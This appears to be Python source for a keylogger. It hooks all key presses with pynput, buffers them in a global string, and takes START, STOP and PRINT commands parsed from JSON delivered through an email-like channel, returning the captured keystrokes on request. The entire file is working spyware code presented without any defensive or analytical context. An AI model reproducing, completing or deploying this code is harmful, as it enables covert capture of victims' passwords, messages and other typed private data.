import json
import threading, keyboard
from urllib import response
import time
from pynput.keyboard import Listener 

class KeyloggerControl:

    @staticmethod
    def Keylogger(key):
        global container
        if not isHook:
            return False
        if isHook:
            tmp = str(key)
            if tmp == 'Key.space':
                tmp = ' '
            elif tmp == '"\'"':
                tmp = "'"
            else:
                tmp = tmp.replace("'", "")
            container += str(tmp)
        return

    @staticmethod
    def Listen():
        with Listener(on_press = KeyloggerControl.Keylogger) as listener:
            listener.join()  
        return
        
    @staticmethod
    def Print():
        return {
            "isSuccess": True,
            "message": container
        }

    
    
    
    @staticmethod
    def LoadData(emailTemplate):
        global action

        action = ''

        requestContent = emailTemplate.Receive()
        if not requestContent:
            return
        jsonContent = json.loads(requestContent)
        body = json.loads(jsonContent["Body"])
        if("Data" in body):
            data = body["Data"]
            if("Action" in data):
                action = data["Action"]

    @staticmethod
    def KeyloggerHandle(emailTemplate):
        global isHook 
        global container

        isHook = True
        container = " "

        threading.Thread(target = KeyloggerControl.Listen).start()

        while True:            
            KeyloggerControl.LoadData(emailTemplate)
            
            if action == 'PRINT':
                return KeyloggerControl.Print()
            elif action == "START":
                isHook = True
            elif action == "STOP":
                isHook = False


